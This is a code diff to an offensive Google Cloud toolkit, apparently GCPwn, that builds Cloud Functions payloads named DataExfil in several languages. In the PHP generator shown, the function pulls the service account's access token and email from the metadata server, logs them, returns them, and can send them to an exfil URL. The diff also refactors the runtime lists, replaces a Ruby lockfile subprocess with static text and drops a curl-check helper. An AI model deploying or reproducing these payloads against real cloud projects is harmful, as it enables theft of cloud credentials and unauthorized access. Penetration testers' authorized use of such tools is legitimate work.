@@ -2,8 +2,6 @@ from __future__ import annotations
 
 import json
 import re
-import subprocess
-import tempfile
 import requests
 from pathlib import Path
 from urllib.parse import urlparse
@@ -417,23 +415,15 @@ _RUNTIME_META: Dict[str, tuple] = {
     "dotnet":  ("GcpwnFunctions.DataExfil", False),  # V2 only
 }
 
-# All known (non-deprecated) runtime IDs — ordered most-recent-first per language.
-# Default for each language is the first entry.
+# Latest stable runtime ID per language — one entry each.
 SUPPORTED_RUNTIMES = [
-    # Python — default: python314
-    "python314", "python313", "python312", "python311", "python310",
-    # Node.js — default: nodejs24 (nodejs26 is Preview)
-    "nodejs24", "nodejs22", "nodejs20", "nodejs18", "nodejs26",
-    # Go — default: go125 (go126 is Preview)
-    "go125", "go124", "go123", "go122", "go121", "go126",
-    # Java — default: java25
-    "java25", "java21", "java17",
-    # Ruby — default: ruby40
-    "ruby40", "ruby34", "ruby33", "ruby32",
-    # PHP (V2 only) — default: php85
-    "php85", "php84", "php83", "php82",
-    # .NET (V2 only) — default: dotnet10
-    "dotnet10", "dotnet8",
+    "python314",  # Python
+    "nodejs24",   # Node.js
+    "go125",      # Go
+    "java25",     # Java
+    "ruby40",     # Ruby
+    "php85",      # PHP  (V2 only)
+    "dotnet10",   # .NET (V2 only)
 ]
 
 # V1-compatible runtime IDs (V1 supports only older, non-PHP/dotnet runtimes)
@@ -766,7 +756,10 @@ public class DataExfil implements HttpFunction {{
     return {"src/main/java/gcpwn/DataExfil.java": java_src, "pom.xml": pom_xml}
 
 
-_RUBY_GEMFILE_LOCK_FALLBACK = """\
+# Gemfile.lock is required by the Cloud Functions Ruby V2 (Cloud Build) runtime —
+# Cloud Build reads it to install exact gem versions; without it the build fails.
+# This is a static text file included in the zip; no Ruby/Bundler tooling runs on the host.
+_RUBY_GEMFILE_LOCK = """\
 GEM
   remote: https://rubygems.org/
   specs:
@@ -789,28 +782,8 @@ DEPENDENCIES
   logger
 
 BUNDLED WITH
-   2.6.7
+   4.0.3
 """
-
-
-def _ruby_gemfile_lock(gemfile_content: str) -> str:
-    try:
-        with tempfile.TemporaryDirectory() as tmp:
-            gf = Path(tmp) / "Gemfile"
-            gf.write_text(gemfile_content, encoding="utf-8")
-            result = subprocess.run(
-                ["bundle", "lock"],
-                cwd=tmp,
-                capture_output=True,
-                text=True,
-                timeout=60,
-            )
-            lock_path = Path(tmp) / "Gemfile.lock"
-            if result.returncode == 0 and lock_path.exists():
-                return lock_path.read_text(encoding="utf-8")
-    except Exception:
-        pass
-    return _RUBY_GEMFILE_LOCK_FALLBACK
 
 
 def _ruby_payload(exfil_url: str = "", secret_path: str = "") -> Dict[str, str]:
@@ -866,16 +839,18 @@ FunctionsFramework.http "dataExfil" do |request|
 end
 """
     gemfile = 'source "https://rubygems.org"\ngem "functions_framework"\ngem "logger"\n'
-    gemfile_lock = _ruby_gemfile_lock(gemfile)
-    return {"app.rb": app_rb, "Gemfile": gemfile, "Gemfile.lock": gemfile_lock}
+    return {"app.rb": app_rb, "Gemfile": gemfile, "Gemfile.lock": _RUBY_GEMFILE_LOCK}
 
 
 def _php_payload(exfil_url: str = "", secret_path: str = "") -> Dict[str, str]:
+    # Cloud Functions sets FUNCTION_TARGET=<entry_point> — the framework auto-discovers
+    # the global PHP function by name, so FunctionsFramework::http() registration is not needed.
+    # GuzzleHttp\Psr7 is always available (transitive dep of google/cloud-functions-framework).
     path_check = ""
     if secret_path:
         path_check = (
             f'    if ($request->getUri()->getPath() !== {repr(secret_path)}) {{\n'
-            f'        return new Response(404);\n'
+            f'        return new \\GuzzleHttp\\Psr7\\Response(404);\n'
             f'    }}\n'
         )
     callback_code = ""
@@ -889,12 +864,6 @@ def _php_payload(exfil_url: str = "", secret_path: str = "") -> Dict[str, str]:
 """
     index_php = f"""\
 <?php
-use Google\\CloudFunctions\\FunctionsFramework;
-use GuzzleHttp\\Psr7\\Response;
-use Psr\\Http\\Message\\ServerRequestInterface;
-use Psr\\Http\\Message\\ResponseInterface;
-
-FunctionsFramework::http('dataExfil', 'dataExfil');
 
 function fetchMeta(string $path): string {{
     $opts = ['http' => ['header' => "Metadata-Flavor: Google\\r\\n"]];
@@ -904,7 +873,7 @@ function fetchMeta(string $path): string {{
     );
 }}
 
-function dataExfil(ServerRequestInterface $request): ResponseInterface {{
+function dataExfil(\\Psr\\Http\\Message\\ServerRequestInterface $request): \\Psr\\Http\\Message\\ResponseInterface {{
 {path_check}\
     $tokenData = json_decode(fetchMeta('token'), true);
     $accessToken = $tokenData['access_token'] ?? '';
@@ -912,7 +881,7 @@ function dataExfil(ServerRequestInterface $request): ResponseInterface {{
     error_log('GCPWN_CF_EMAIL=' . $email);
     error_log('GCPWN_CF_TOKEN=' . $accessToken);
 {callback_code}\
-    return new Response(200, ['Content-Type' => 'application/json'],
+    return new \\GuzzleHttp\\Psr7\\Response(200, ['Content-Type' => 'application/json'],
         json_encode(['email' => $email, 'access_token' => $accessToken]));
 }}
 """
@@ -1578,9 +1547,6 @@ class CloudFunctionsResource:
             return True
         except Exception:
             return False
-
-    def check_external_curl(self, *, function_url: str):
-        return check_anonymous_external(function_url=function_url)
 
     def download(self, *, row: Any | None = None, resource_id: str | None = None, output: str | None = None) -> list[Path]:
         """Download a function's source-code zip from its backing GCS object to disk.
